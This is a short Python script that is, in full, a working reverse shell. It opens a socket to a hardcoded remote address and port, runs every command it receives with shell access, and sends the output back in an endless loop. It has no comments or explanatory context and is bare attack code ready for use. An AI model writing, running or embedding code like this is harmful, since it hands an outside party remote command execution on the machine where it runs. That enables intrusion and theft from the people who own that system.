import socket
import subprocess


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect(("192.168.242.120", 12345))
while True:
    message = (client_socket.recv(1024).decode("utf-8"))
    result = subprocess.run(message, shell=True, capture_output=True, text=True)
    client_socket.sendall(result.stdout.encode("utf-8"))
